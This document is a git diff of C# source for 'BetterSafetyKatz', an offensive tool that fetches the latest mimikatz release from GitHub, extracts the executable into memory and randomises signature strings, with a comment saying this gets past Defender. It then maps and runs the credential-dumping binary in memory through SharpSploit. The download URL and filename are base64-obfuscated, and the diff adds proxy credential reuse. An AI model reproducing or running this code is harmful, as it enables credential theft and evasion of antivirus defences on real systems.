@@ -1,16 +1,13 @@
 ﻿using System;
-using System.Runtime.InteropServices;
-using System.Diagnostics;
 using System.IO;
 using System.Security.Principal;
-using System.IO.Compression;
 using System.Net;
 using System.Text.RegularExpressions;
-using Internals;
 using System.Text;
 using System.Linq;
-using System.Collections.Generic;
 using System.Threading;
+using SharpSploit;
+
 
 namespace BetterSafetyKatz
 {
@@ -35,12 +32,22 @@ namespace BetterSafetyKatz
             }
             else
             {
-
+               
                 if (!(IntPtr.Size == 8))
                 {
                     Console.WriteLine("[X] Process is not 64-bit, this version of katz won't work yo'!");
                     return;
                 }
+
+
+                // @Arno0x
+                IWebProxy defaultProxy = WebRequest.DefaultWebProxy;
+                if (defaultProxy != null)
+                {
+                    defaultProxy.Credentials = CredentialCache.DefaultCredentials;
+                    webClient.Proxy = defaultProxy;
+                }
+
 
                 //TLS / SSL fix for old Net WebClient
                 ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
@@ -48,7 +55,7 @@ namespace BetterSafetyKatz
                 //headers needed for the github API to answer back
                 webClient.Headers.Set("User-Agent", "request");
 
-                //https://api.github.com/repos/BADWORD/BADWORD/releases/latest
+         
                 //Ask the API for the latest releases, should prob be async but lazy
                 string latestReleases = webClient.DownloadString(Encoding.UTF8.GetString(Convert.FromBase64String("aHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy9nZW50aWxraXdpL21pbWlrYXR6L3JlbGVhc2VzL2xhdGVzdA==")));
 
@@ -67,7 +74,7 @@ namespace BetterSafetyKatz
                 MemoryStream catStream = new MemoryStream();
 
                 // unzip.Extract(@"x64/BADWORD.exe", catStream);
-                (new Unzip(new MemoryStream(zipStream))).Extract(Encoding.UTF8.GetString(Convert.FromBase64String("eDY0L21pbWlrYXR6LmV4ZQ==")), catStream);
+                (new SharpSploit.Misc.Unzip(new MemoryStream(zipStream))).Extract(Encoding.UTF8.GetString(Convert.FromBase64String("eDY0L21pbWlrYXR6LmV4ZQ==")), catStream);
 
                 Console.WriteLine("[+] Randomizing strings in memory");
 
@@ -78,7 +85,7 @@ namespace BetterSafetyKatz
 
                 //These are Function names from external DLL, they are detected, but luckly katz mainly "works" without them
                 // 05.10.2020 -  Turns out we don't need to replace these to get past Defender, so it's excluded to avoid some functions breaking
-                
+                /*
                 var strinsToReplaceUTF = new string[] {
 
                     "I_NetServerTrustPasswordsGet",
@@ -87,7 +94,7 @@ namespace BetterSafetyKatz
                     "SamEnumerateDomainsInSamServer"
 
                };
-               
+               */
 
                 //Stuff that might have signatures, but that we can give random names (Menu stuff)
                 var stringsToSlightlyObfuscate = new string[] {
@@ -149,7 +156,7 @@ namespace BetterSafetyKatz
                 {
                     string hexReplace = BitConverter.ToString(Encoding.Unicode.GetBytes(sigString)).Replace("-", string.Empty);
 
-                    string newData = BitConverter.ToString(Encoding.Unicode.GetBytes(Helpers.RandomString(sigString.Length))).Replace("-", string.Empty);
+                    string newData = BitConverter.ToString(Encoding.Unicode.GetBytes(SharpSploit.Misc.Helpers.RandomString(sigString.Length))).Replace("-", string.Empty);
 
                     hexCats = hexCats.Replace(hexReplace, newData);
                 }
@@ -159,16 +166,16 @@ namespace BetterSafetyKatz
 
                     string hexReplace = BitConverter.ToString(Encoding.UTF8.GetBytes(menuString)).Replace("-", string.Empty);
 
-                    char mostUsedChar = Helpers.MostOccurringCharInString(menuString);
+                    char mostUsedChar = SharpSploit.Misc.Helpers.MostOccurringCharInString(menuString);
 
-                    char replaceChar = Helpers.GetLetter();
+                    char replaceChar = SharpSploit.Misc.Helpers.GetLetter();
 
                     string newData = BitConverter.ToString(Encoding.UTF8.GetBytes(menuString.Replace(mostUsedChar, replaceChar))).Replace("-", string.Empty);
 
                     hexCats = hexCats.Replace(hexReplace, newData);
                 }
 
-                
+                /*
                 foreach (var reffString in strinsToReplaceUTF)
                 {
                     string hexReplace = BitConverter.ToString(Encoding.UTF8.GetBytes(reffString)).Replace("-", string.Empty);
@@ -177,14 +184,12 @@ namespace BetterSafetyKatz
 
                     hexCats = hexCats.Replace(hexReplace, newData);
                 }
-                *
+                */
 
+                SharpSploit.Execution.PE.PE_MANUAL_MAP MapMap = SharpSploit.Execution.ManualMap.Map.MapModuleToMemory(SharpSploit.Misc.Helpers.StringToByteArray(hexCats));
+                SharpSploit.Execution.DynamicInvoke.Generic.CallMappedDLLModule(MapMap.PEINFO, MapMap.ModuleBase);
 
-        
-                SharpSploit.Execution.PE.PE_MANUAL_MAP MapMap = SharpSploit.Execution.ManualMap.Map.MapModuleToMemory(Helpers.StringToByteArray(hexCats));
-                SharpSploit.Execution.DynamicInvoke.Generic.CallMappedPEModule(MapMap.PEINFO, MapMap.ModuleBase);
-
-                Console.ReadLine();
+                Thread.Sleep(Timeout.Infinite);
 
              
 
